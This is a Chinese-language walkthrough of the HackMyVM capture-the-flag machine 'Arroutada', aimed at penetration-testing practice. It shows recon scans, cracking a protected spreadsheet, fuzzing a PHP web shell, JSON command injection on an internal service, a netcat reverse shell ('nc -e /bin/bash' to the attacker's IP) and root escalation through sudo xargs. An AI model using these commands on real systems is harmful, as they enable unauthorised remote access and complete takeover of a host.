---
title: Arroutada
author: hgbe02
date: 2024-04-27
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Arroutada.html"
---

# Arroutada

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734638.png" alt="image-20240427122650508" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734639.png" alt="image-20240427163455727" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ rustscan -a 192.168.0.147 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.147:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ gobuster dir -u http://192.168.0.147/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,jpg,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.147/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,jpg,txt,html,php,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/imgs                 (Status: 301) [Size: 313] [--> http://192.168.0.147/imgs/]
/scout                (Status: 301) [Size: 314] [--> http://192.168.0.147/scout/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734640.png" alt="image-20240427163653649" style="zoom:50%;" />

### 敏感目录

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/scout/ | uniq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   779  100   779    0     0   334k      0 --:--:-- --:--:-- --:--:--  380k

<div>
<p>
Hi, Telly,
<br>
I just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:
<br>
/scout/******/docs/
<br>
With continued gratitude,
<br>
J1.
</p>
</div>
<!-- Stop please -->

<!-- I told you to stop checking on me! -->

<!-- OK... I'm just J1, the boss. -->
```

继续探查一下二级目录：

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ feroxbuster -u http://192.168.0.147/scout/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 3 -s 200 301 302
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.0.147/scout/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      388l       74w      779c http://192.168.0.147/scout/
301      GET        9l       28w      322c http://192.168.0.147/scout/content => http://192.168.0.147/scout/content/
301      GET        9l       28w      319c http://192.168.0.147/scout/data => http://192.168.0.147/scout/data/
301      GET        9l       28w      319c http://192.168.0.147/scout/java => http://192.168.0.147/scout/java/
301      GET        9l       28w      318c http://192.168.0.147/scout/img => http://192.168.0.147/scout/img/
301      GET        9l       28w      323c http://192.168.0.147/scout/exploits => http://192.168.0.147/scout/exploits/
301      GET        9l       28w      316c http://192.168.0.147/scout/1 => http://192.168.0.147/scout/1/
301      GET        9l       28w      320c http://192.168.0.147/scout/links => http://192.168.0.147/scout/links/
301      GET        9l       28w      323c http://192.168.0.147/scout/download => http://192.168.0.147/scout/download/
301      GET        9l       28w      319c http://192.168.0.147/scout/html => http://192.168.0.147/scout/html/
301      GET        9l       28w      317c http://192.168.0.147/scout/j1 => http://192.168.0.147/scout/j1/
301      GET        9l       28w      319c http://192.168.0.147/scout/scan => http://192.168.0.147/scout/scan/
301      GET        9l       28w      317c http://192.168.0.147/scout/j2 => http://192.168.0.147/scout/j2/
301      GET        9l       28w      322c http://192.168.0.147/scout/j2/docs => http://192.168.0.147/scout/j2/docs/
..........
200      GET       39l      207w    19981c http://192.168.0.147/scout/j2/docs/shellfile.ods
..........
200      GET        2l        4w       27c http://192.168.0.147/scout/j2/docs/z206
..........
200      GET        1l        1w       14c http://192.168.0.147/scout/j2/docs/pass.txt
..........
200      GET        0l        0w        0c http://192.168.0.147/scout/j2/docs/z131
200      GET        0l        0w        0c http://192.168.0.147/scout/j2/docs/z655
301      GET        9l       28w      318c http://192.168.0.147/scout/bye => http://192.168.0.147/scout/bye/
301      GET        9l       28w      320c http://192.168.0.147/scout/spell => http://192.168.0.147/scout/spell/
```

其他文件大小都是0，查看一下这些信息：

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/scout/j2/docs/pass.txt
user:password

┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/scout/j2/docs/z206    
Ignore z*, please
Jabatito

┌──(kali💀kali)-[~/temp/Arroutada]
└─$ wget http://192.168.0.147/scout/j2/docs/shellfile.ods                
--2024-04-27 04:48:44--  http://192.168.0.147/scout/j2/docs/shellfile.ods
Connecting to 192.168.0.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11821 (12K) [application/vnd.oasis.opendocument.spreadsheet]
Saving to: ‘shellfile.ods’

shellfile.ods                         100%[=========================================================================>]  11.54K  --.-KB/s    in 0s      

2024-04-27 04:48:44 (871 MB/s) - ‘shellfile.ods’ saved [11821/11821]

┌──(kali💀kali)-[~/temp/Arroutada]
└─$ file shellfile.ods                                                                                                            
shellfile.ods: OpenDocument Spreadsheet
```

### 尝试爆破ods

> ODS is **a type of Open Document Format for Office Applications**. It stores data in cells that are organized into rows and columns. ODS files can also be opened in Microsoft Excel and saved as XLS or XLSX files.

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734641.png" alt="image-20240427165412259" style="zoom: 50%;" />

尝试破解一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734642.png" alt="image-20240427170003771" style="zoom:50%;" />

爆破一下：

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 256/256 AVX2 8x BF/AES])
Cost 1 (iteration count) is 100000 for all loaded hashes
Cost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john11           (shellfile.ods)     
1g 0:00:01:23 DONE (2024-04-27 05:02) 0.01192g/s 197.0p/s 197.0c/s 197.0C/s lachina..iloveyou18
Use the "--show --format=ODF" options to display all of the cracked passwords reliably
Session completed.
```

[在线解密](https://products.aspose.app/cells/unlock/ods)一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734644.png" alt="image-20240427170534307" style="zoom:50%;" />

发现了目录`/thejabasshell.php`

### FUZZ

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/thejabasshell.php
```

没有回应，尝试一下fuzz相关参数。

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://192.168.0.147/thejabasshell.php?FUZZ=whoami -fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.147/thejabasshell.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

a                       [Status: 200, Size: 33, Words: 5, Lines: 1, Duration: 1ms]
:: Progress: [26584/26584] :: Job [1/1] :: 619 req/sec :: Duration: [0:00:04] :: Errors: 2 ::
```

尝试执行以下命令：

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/thejabasshell.php?a=whoami                                                                                         
Error: Problem with parameter "b"  
```

还有个参数，尝试继续fuzz！

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u 'http://192.168.0.147/thejabasshell.php?a=whoami&b=FUZZ'  -fw 5

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.147/thejabasshell.php?a=whoami&b=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

pass                    [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 16ms]
:: Progress: [26584/26584] :: Job [1/1] :: 457 req/sec :: Duration: [0:00:04] :: Errors: 2 ::
```

查看一下：

```bash
┌──(kali💀kali)-[~/temp/Arroutada]
└─$ curl http://192.168.0.147/thejabasshell.php?a=whoami&b=pass[3] 132213
                                                                                                                                                        
Error: Problem with parameter "b"[3]    done       curl http://192.168.0.147/thejabasshell.php?a=whoami
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734645.png" alt="image-20240427171223436" style="zoom:50%;" />

执行了相关命令！反弹shell！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734646.png" alt="image-20240427171357651" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@arroutada:/var/www/html$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
(remote) www-data@arroutada:/var/www/html$ ls -la
total 24
drwxr-xr-x  4 root root 4096 Jan  8  2023 .
drwxr-xr-x  3 root root 4096 Jan  8  2023 ..
drwxr-xr-x  2 root root 4096 Jan  8  2023 imgs
-rw-r--r--  1 root root   59 Jan  8  2023 index.html
drwxr-xr-x 22 root root 4096 Jan  8  2023 scout
-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php
(remote) www-data@arroutada:/var/www/html$ cd ../
(remote) www-data@arroutada:/var/www$ ls
html
(remote) www-data@arroutada:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
drwxr-xr-x  4 root root 4096 Jan  8  2023 html
(remote) www-data@arroutada:/var/www$ cd ..
(remote) www-data@arroutada:/var$ ls -la
total 48
drwxr-xr-x 12 root root  4096 Jan  8  2023 .
drwxr-xr-x 18 root root  4096 Jan  8  2023 ..
drwxr-xr-x  2 root root  4096 Apr 27 04:18 backups
drwxr-xr-x 10 root root  4096 Jan  8  2023 cache
drwxr-xr-x 26 root root  4096 Jan  8  2023 lib
drwxrwsr-x  2 root staff 4096 Sep  3  2022 local
lrwxrwxrwx  1 root root     9 Jan  8  2023 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Jan  8  2023 log
drwxrwsr-x  2 root mail  4096 Jan  8  2023 mail
drwxr-xr-x  2 root root  4096 Jan  8  2023 opt
lrwxrwxrwx  1 root root     4 Jan  8  2023 run -> /run
drwxr-xr-x  4 root root  4096 Jan  8  2023 spool
drwxrwxrwt  2 root root  4096 Apr 27 04:15 tmp
drwxr-xr-x  3 root root  4096 Jan  8  2023 www
(remote) www-data@arroutada:/var$ cd backups/
(remote) www-data@arroutada:/var/backups$ ls -la
total 20
drwxr-xr-x  2 root root 4096 Apr 27 04:18 .
drwxr-xr-x 12 root root 4096 Jan  8  2023 ..
-rw-r--r--  1 root root 9034 Jan 10  2023 apt.extended_states.0
(remote) www-data@arroutada:/var/backups$ ls -la /home 
total 12
drwxr-xr-x  3 root  root  4096 Jan  8  2023 .
drwxr-xr-x 18 root  root  4096 Jan  8  2023 ..
drwxr-x---  3 drito drito 4096 Jan 10  2023 drito
(remote) www-data@arroutada:/var/backups$ cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
drito:x:1001:1001::/home/drito:/bin/bash
(remote) www-data@arroutada:/var/backups$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/umount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
(remote) www-data@arroutada:/var/backups$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
(remote) www-data@arroutada:/var/backups$ ss -altp
State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port           Process           
LISTEN            0                 4096                             127.0.0.1:8000                            0.0.0.0:*                                
LISTEN            0                 511                                      *:http                                  *:*                        
(remote) www-data@arroutada:/var/backups$ ss -altp
State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port           Process           
LISTEN            0                 4096                             127.0.0.1:8000                            0.0.0.0:*                                
LISTEN            0                 511                                      *:http                                  *:*                                
(remote) www-data@arroutada:/var/backups$ nc 0.0.0.0 8000
whoami
^C
(remote) www-data@arroutada:/var/backups$ cd /tmp            
(remote) www-data@arroutada:/tmp$ curl http://127.0.0.1:8000
bash: curl: command not found
(remote) www-data@arroutada:/tmp$ busybox curl http://127.0.0.1:8000
curl: applet not found
(remote) www-data@arroutada:/tmp$ wget http://127.0.0.1:8000
--2024-04-27 05:18:22--  http://127.0.0.1:8000/
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 319 [text/html]
Saving to: 'index.html'

index.html                            100%[=========================================================================>]     319  --.-KB/s    in 0.02s   

2024-04-27 05:18:22 (15.7 KB/s) - 'index.html' saved [319/319]

(remote) www-data@arroutada:/tmp$ cat index.html 
<h1>Service under maintenance</h1>


<br>


<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>

<!-- Please sanitize /priv.php -->
```

### 套娃

开放了一个`8000`端口，且提取出来信息，正好我见过，这是`brainfuck`编码：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734647.png" alt="image-20240427172009297" style="zoom:50%;" />

```apl
all HackMyVM hackers!!
```

继续查看一下它给的另一个子目录：

```bash
(remote) www-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php
--2024-04-27 05:21:38--  http://127.0.0.1:8000/priv.php
Connecting to 127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'priv.php'

priv.php                                  [ <=>                                                                      ]     308  --.-KB/s    in 0s      

2024-04-27 05:21:38 (75.6 MB/s) - 'priv.php' saved [308]

(remote) www-data@arroutada:/tmp$ cat priv.php 
Error: the "command" parameter is not specified in the request body.

/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

存在命令执行！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734648.png" alt="image-20240427172521351" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734649.png" alt="image-20240427172538279" style="zoom:50%;" />

尝试执行：

```
wget --post-data 'command=whoami' http://127.0.0.1:8000/priv.php -q -o -
```

> **`-q`**:
>
> + 这个参数告诉 `wget` 在运行时不要输出任何信息。也就是说，它会在“安静”模式下运行，不显示进度或错误消息。
>
> **`-O -`**:
>
> + `-O` 参数用于指定输出文件的名称。
>
> + 在这里，`-`（一个破折号）是一个特殊值，它告诉 `wget` 将输出直接写入标准输出（通常是终端或命令行界面）。这意味着服务器的响应将直接显示在命令行上，而不是保存到文件中。

额，是json格式的：

```bash
(remote) www-data@arroutada:/tmp$ wget --post-data='{"command":"whoami"}' http://127.0.0.1:8000/priv.php -q -O -
drito


/*

$json = file_get_contents('php://input');
$data = json_decode($json, true);

if (isset($data['command'])) {
    system($data['command']);
} else {
    echo 'Error: the "command" parameter is not specified in the request body.';
}

*/
```

成功执行了!

### 切换至www-data

```bash
wget --post-data='{"command":"nc -e /bin/bash 192.168.0.143 1234"}' http://127.0.0.1:8000/priv.php -q -O -
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271734650.png" alt="image-20240427173204000" style="zoom:50%;" />

信息搜集了一下：

```bash
(remote) drito@arroutada:/home/drito/web$ sudo -l
Matching Defaults entries for drito on arroutada:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User drito may run the following commands on arroutada:
    (ALL : ALL) NOPASSWD: /usr/bin/xargs
```

发现漏洞利用方式：https://gtfobins.github.io/gtfobins/xargs/#sudo

### xargs提权！！！

```bash
(remote) drito@arroutada:/home/drito/web$ sudo /usr/bin/xargs -a /dev/null bash
root@arroutada:/home/drito/web# cd /root
root@arroutada:~# ls -la
ctotal 28
drwx------  3 root root 4096 Jan  8  2023 .
drwxr-xr-x 18 root root 4096 Jan  8  2023 ..
-rw-------  1 root root   88 Jan  8  2023 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Jan  8  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-r--------  1 root root   37 Jan  8  2023 root.txt
root@arroutada:~# cat root.txt 
R3VuYXhmR2JGenlOYXFOeXlVbnB4WmxJWg==
root@arroutada:~# cd /home
root@arroutada:/home# ls
drito
root@arroutada:/home# cd drito/
root@arroutada:/home/drito# ls -la
total 48
drwxr-x--- 3 drito drito  4096 Jan 10  2023 .
drwxr-xr-x 3 root  root   4096 Jan  8  2023 ..
-rw-r--r-- 1 drito drito   220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 drito drito  3526 Mar 27  2022 .bashrc
-rw-r--r-- 1 drito drito   807 Mar 27  2022 .profile
---x--x--x 1 drito drito 16608 Jan  8  2023 service
-r-------- 1 drito drito    33 Jan  8  2023 user.txt
d-wx--x--x 2 drito drito  4096 Jan  8  2023 web
root@arroutada:/home/drito# cat user.txt 
785f64437c6e1f9af6aa1afcc91ed27c
```

得到rootshell！！！！

### 解码rootflag！

![image-20240427173734062](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404271740124.png)

## 参考

https://n00br00t.github.io/posts/HMV-arroutada/

https://www.cnblogs.com/azwhikaru/p/17264599.html

https://nepcodex.com/2023/01/arroutada-writeup-from-hackmyvm-walkthrough/